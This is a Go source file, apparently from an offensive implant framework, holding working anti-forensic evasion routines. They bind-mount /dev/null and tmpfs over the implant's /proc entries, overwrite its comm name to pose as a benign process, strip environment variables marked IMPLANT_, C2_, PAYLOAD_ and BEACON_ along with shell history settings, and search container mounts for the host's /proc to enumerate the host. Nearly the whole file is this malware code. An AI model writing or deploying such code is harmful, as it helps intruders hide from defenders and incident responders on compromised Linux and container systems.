package evasion

import (
	"fmt"
	"os"
	"strings"

	"golang.org/x/sys/unix"
)

// HideProcEntry uses mount namespace techniques to make the implant's process
// less visible in /proc. This works within the implant's mount namespace and
// does not affect the host's /proc view (unless we have escaped to the host ns).
//
// Techniques:
//   - Bind-mount /dev/null over /proc/[pid]/status, cmdline, maps
//   - Mount tmpfs over /proc/[pid]/fd to hide file descriptors
func HideProcEntry() error {
	pid := os.Getpid()
	procPath := fmt.Sprintf("/proc/%d", pid)

	// Verify the proc entry exists.
	if _, err := os.Stat(procPath); err != nil {
		return fmt.Errorf("procfs: cannot stat %s: %w", procPath, err)
	}

	// Paths to mask with /dev/null (single files).
	maskFiles := []string{
		fmt.Sprintf("/proc/%d/maps", pid),
		fmt.Sprintf("/proc/%d/smaps", pid),
		fmt.Sprintf("/proc/%d/syscall", pid),
		fmt.Sprintf("/proc/%d/stack", pid),
	}

	var firstErr error
	for _, path := range maskFiles {
		if _, err := os.Stat(path); err != nil {
			continue
		}
		if err := unix.Mount("/dev/null", path, "", unix.MS_BIND, ""); err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("procfs: failed to mask %s: %w", path, err)
			}
		}
	}

	// Mount empty tmpfs over /proc/[pid]/fd to hide open file descriptors.
	fdPath := fmt.Sprintf("/proc/%d/fd", pid)
	if _, err := os.Stat(fdPath); err == nil {
		if err := unix.Mount("tmpfs", fdPath, "tmpfs", unix.MS_NOSUID|unix.MS_NODEV|unix.MS_NOEXEC, "size=4096,mode=0555"); err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("procfs: failed to mount tmpfs over %s: %w", fdPath, err)
			}
		}
	}

	return firstErr
}

// SpoofProcInfo modifies the /proc/[pid]/comm and cmdline entries to make the
// process appear as a different, benign process. The comm field is writable by
// the owning process. The cmdline entry is modified by overwriting the process
// argv in memory (see MasqueradeArgs for that approach); this function handles
// the comm field only.
func SpoofProcInfo(pid int, name string) error {
	// /proc/[pid]/comm can be written to by the process itself to change
	// the name shown in ps, top, etc. Truncated to 15 chars by the kernel.
	commPath := fmt.Sprintf("/proc/%d/comm", pid)

	// Truncate to TASK_COMM_LEN - 1 (15 bytes).
	commName := name
	if len(commName) > 15 {
		commName = commName[:15]
	}

	if err := os.WriteFile(commPath, []byte(commName), 0644); err != nil {
		return fmt.Errorf("procfs: failed to write comm for pid %d: %w", pid, err)
	}

	return nil
}

// CleanEnviron scrubs the current process's environment of suspicious variables
// that could reveal the implant's presence or origin. This affects /proc/self/environ
// since the kernel reads environment data from the process's memory.
func CleanEnviron() error {
	// Suspicious environment variable names and prefixes to remove.
	suspiciousVars := []string{
		"LD_PRELOAD",
		"LD_LIBRARY_PATH",
		"HISTFILE",
		"HISTSIZE",
		"HISTCONTROL",
		"_NS_STAGE", // Our own namespace stage marker.
		"IMPLANT_",
		"C2_",
		"PAYLOAD_",
		"BEACON_",
		"SHELL_OVERRIDE",
		"TERM_PROGRAM",
	}

	suspiciousPrefixes := []string{
		"IMPLANT_",
		"C2_",
		"PAYLOAD_",
		"BEACON_",
		"NS_",
	}

	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) < 1 {
			continue
		}
		key := parts[0]

		shouldRemove := false
		for _, sv := range suspiciousVars {
			if strings.EqualFold(key, sv) {
				shouldRemove = true
				break
			}
		}

		if !shouldRemove {
			for _, prefix := range suspiciousPrefixes {
				if strings.HasPrefix(strings.ToUpper(key), prefix) {
					shouldRemove = true
					break
				}
			}
		}

		if shouldRemove {
			os.Unsetenv(key)
		}
	}

	return nil
}

// GetHostProc attempts to locate the host's /proc filesystem. When running
// inside a mount namespace, the host's /proc may still be accessible via
// bind mounts or other mount points. This is useful for host enumeration
// from within the namespace.
//
// Returns the path to the host's /proc, or an empty string if not found.
func GetHostProc() string {
	// Common paths where host /proc might be accessible.
	candidates := []string{
		"/host/proc",           // Common Docker/K8s host mount.
		"/rootfs/proc",         // Some container runtimes mount host rootfs.
		"/proc/1/root/proc",    // Via PID 1's root (if we can traverse it).
		"/var/lib/ns/hostproc", // Custom mount point used by this implant.
	}

	for _, path := range candidates {
		// Verify it's actually a different /proc by checking for host-specific
		// content. In a PID namespace, our /proc will show limited PIDs.
		if isHostProc(path) {
			return path
		}
	}

	return ""
}

// isHostProc verifies that a given path appears to be the host's /proc
// rather than a namespace-local /proc. Host /proc will have many more
// PIDs and different uptime values.
func isHostProc(path string) bool {
	// Check if the path exists and is accessible.
	fi, err := os.Stat(path)
	if err != nil || !fi.IsDir() {
		return false
	}

	// Check for host indicators: /proc/1/cmdline on the host should be
	// an init system, and there should be many PIDs.
	initCmdline := fmt.Sprintf("%s/1/cmdline", path)
	data, err := os.ReadFile(initCmdline)
	if err != nil {
		return false
	}

	cmdline := strings.ToLower(string(data))

	// If PID 1 is a real init system and we're in a PID namespace where
	// our PID 1 is different, this is likely the host's /proc.
	hostInits := []string{"systemd", "init", "/sbin/init", "/lib/systemd"}
	for _, init := range hostInits {
		if strings.Contains(cmdline, init) {
			// Double-check: our own /proc/1/cmdline should be different.
			ourInit, err := os.ReadFile("/proc/1/cmdline")
			if err != nil {
				return true
			}
			if string(ourInit) != string(data) {
				return true
			}
		}
	}

	return false
}
